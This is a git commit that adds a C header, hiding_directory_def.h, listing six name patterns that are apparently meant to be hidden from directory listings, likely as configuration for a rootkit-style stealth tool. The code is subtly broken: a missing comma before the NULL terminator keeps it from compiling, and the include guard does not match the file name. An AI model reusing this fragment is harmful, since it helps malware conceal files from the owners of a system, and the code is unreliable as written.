3fdcd2febd338e09c7745ba3e8b89fa120faa9b4
Primordial Essence <67337496+pr1m0rdial@users.noreply.github.com>
2026-07-07 21:25:12 +0700

    Add files via upload

---
+++ include/hiding_directory_def.h
@@ -0,0 +1,14 @@
+#ifndef HIDING_FILES_DEF_H
+#define HIDING_FILES_DEF_H
+
+static const char *hidden_patterns[] = {
+    "jira",
+    "singularity",
+    "obliviate",
+    "zer0t",
+    "nirm",
+    "w00t"
+    NULL  
+};
+
+#endif
